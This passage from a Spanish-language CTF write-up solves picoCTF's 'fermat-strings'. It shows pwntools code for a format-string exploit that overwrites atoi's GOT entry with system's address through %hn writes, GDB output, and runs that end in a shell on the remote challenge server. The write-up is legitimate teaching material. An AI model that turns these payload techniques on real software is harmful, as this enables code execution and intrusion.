<span class="mtk1">payload_b</span> <span class="mtk5">+=</span> <span class="mtk7 mtki">f</span><span class="mtk4">'%12$hn'</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">()</span>

<span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">,</span> <span class="mtk9 mtki">gdbscript</span><span class="mtk5">=</span><span class="mtk4">'break</span> <span class="mtk4">atoi</span><span class="mtk6">\n</span><span class="mtk4">continue</span><span class="mtk6">\n</span><span class="mtk4">continue</span><span class="mtk6">\n</span><span class="mtk4">continue</span><span class="mtk6">\n</span><span class="mtk4">got'</span><span class="mtk1">)</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_a</span><span class="mtk1">)</span>
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'B:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_b</span><span class="mtk1">)</span>
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>Lo primero a notar es el uso de operadores AND para coger los 2 últimos bytes de la dirección de <code>system</code>. Y luego está el operador módulo <code>0xffff</code> para evitar números negativos. Después utilizamos <code>%11$hn</code>.</p><p>Para sobrescribir los siguientes 2 bytes, necesitamos poner la dirección de <code>atoi</code> en la GOT pero más 2 (ya que queremos escribir los siguientes 2 bytes). Y por tanto, necesitamos utilizar <code>%12$hn</code>. Por el momento, dejamos la segunda parte varía (solo <code>%12$hn</code>).</p><p>Añadimos el proceso a GDB y mostramos las entradas de la GOT:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  got

GOT protection: Partial RelRO | GOT functions: 9

[0x601018] <span class="code-dark-green">puts@GLIBC_2.2.5  →  0x7f70473075a0</span>
[0x601020] <span class="code-dark-yellow">__stack_chk_fail@GLIBC_2.4  →  0x4006d6</span>  
[0x601028] <span class="code-dark-green">setbuf@GLIBC_2.2.5  →  0x7f704730ec50</span>
[0x601030] <span class="code-dark-green">printf@GLIBC_2.2.5  →  0x7f70472e4e10</span>
[0x601038] <span class="code-dark-green">snprintf@GLIBC_2.2.5  →  0x7f70472e4ee0</span>
[0x601040] <span class="code-dark-yellow">pow@GLIBC_2.2.5  →  0x400837</span>
[0x601048] <span class="code-dark-green">strcspn@GLIBC_2.2.5  →  0x7f70474067b0</span>
[0x601050] <span class="code-dark-green">read@GLIBC_2.2.5  →  0x7f7047391130</span>
[0x601058] <span class="code-dark-green">atoi@GLIBC_2.2.5  →  0x7f7054105410</span>
</code></pre></div><p>Se observa que los dos últimos bytes fueron sobrescritos correctamente (al menos los 3 últimos dígitos hexadecimales son <code>410</code>, coinciden con el <em>offset</em> de <code>system</code>). Y además, vemos que los siguientes 2 bytes tienen el mismo valor que los 2 últimos bytes (<code>5410</code>).</p><p>Sabiendo esto, podemos calcular el número de bytes a escribir para lograr poner el número correcto en esa posición:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">bytes_to_print</span> <span class="mtk5">=</span> <span class="mtk1">((</span><span class="mtk1">system_addr</span> <span class="mtk5">&amp;</span> <span class="mtk7 mtki">0x</span><span class="mtk6">ffff</span><span class="mtk1">)</span> <span class="mtk5">-</span> <span class="mtk1">bytes_on_stack</span> <span class="mtk5">-</span> <span class="mtk6">2</span><span class="mtk1">)</span> <span class="mtk5">%</span> <span class="mtk7 mtki">0x</span><span class="mtk6">ffff</span>

<span class="mtk1">payload_a</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'1234567.'</span> <span class="mtk5">+</span> <span class="mtk1">p64(</span><span class="mtk1">atoi_got</span><span class="mtk1">)</span> <span class="mtk5">+</span> <span class="mtk1">p64(</span><span class="mtk1">atoi_got</span> <span class="mtk5">+</span> <span class="mtk6">2</span><span class="mtk1">)</span>
<span class="mtk1">payload_b</span> <span class="mtk5">=</span> <span class="mtk7 mtki">f</span><span class="mtk4">'1.%</span><span class="mtk6">{</span><span class="mtk1">bytes_to_print</span><span class="mtk6">}</span><span class="mtk4">c'</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">()</span> <span class="mtk5">+</span> <span class="mtk7 mtki">b</span><span class="mtk4">'%11$hn'</span>

<span class="mtk1">bytes_to_print</span> <span class="mtk5">=</span> <span class="mtk1">(((</span><span class="mtk1">system_addr</span> <span class="mtk5">&gt;&gt;</span> <span class="mtk6">16</span><span class="mtk1">)</span> <span class="mtk5">-</span> <span class="mtk1">system_addr</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span> <span class="mtk7 mtki">0x</span><span class="mtk6">ffff</span><span class="mtk1">)</span> <span class="mtk5">%</span> <span class="mtk7 mtki">0x</span><span class="mtk6">ffff</span>  

<span class="mtk1">payload_b</span> <span class="mtk5">+=</span> <span class="mtk7 mtki">f</span><span class="mtk4">'%</span><span class="mtk6">{</span><span class="mtk1">bytes_to_print</span><span class="mtk6">}</span><span class="mtk4">c'</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">()</span> <span class="mtk5">+</span> <span class="mtk7 mtki">b</span><span class="mtk4">'%12$hn'</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_a</span><span class="mtk1">)</span>
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'B:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload_b</span><span class="mtk1">)</span>
<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>

<span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>Y todo funciona genial en local:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-green">+</span>] Starting local process './chall': pid 547640  
[<span class="code-green">+</span>] Leaked atoi() address: 0x7f05651e4730
[<span class="code-green">+</span>] Leaked puts() address: 0x7f05652245a0
[<span class="code-green">+</span>] Glibc base address: 0x7f056519d000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
chall  chall.c    Dockerfile  solve.py
</code></pre></div><h2 id="_flag_"><em>Flag</em></h2><p>Vamos a ver en remoto:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> mars.picoctf.net 31929
[<span class="code-green">+</span>] Opening connection to mars.picoctf.net on port 31929: Done  
[<span class="code-green">+</span>] Leaked atoi() address: 0x7fc3974da730
[<span class="code-green">+</span>] Leaked puts() address: 0x7fc39751a5a0
[<span class="code-green">+</span>] Glibc base address: 0x7fc397493000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
flag.txt
run
<span class="code-red">$</span> cat flag.txt
picoCTF{f3rm4t_pwn1ng_s1nc3_th3_17th_c3ntury}
</code></pre></div><p>El <em>exploit</em> completo se puede encontrar aquí: <a href="https://github.com/7Rocky/CTF-scripts/blob/main/picoCTF/Binary%20Exploitation/fermat-strings/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#análisis-de-código-estático">Análisis de código estático</a></li><li><a href="#vulnerabilidad-de-_format-string_">Vulnerabilidad de <em>Format String</em></a></li><li><a href="#explotación-de-_format-string_">Explotación de <em>Format String</em></a><ul><li><a href="#explotación-manual">Explotación manual</a></li><li><a href="#realizando-fugas-de-memoria">Realizando fugas de memoria</a></li><li><a href="#sobrescritura-de-la-got">Sobrescritura de la GOT</a></li><li><a href="#encontrando-la-versión-de-glibc-remota">Encontrando la versión de Glibc remota</a></li><li><a href="#corrigiendo-el-_exploit_">Corrigiendo el <em>exploit</em></a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="tiniletter">TinyLetter</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>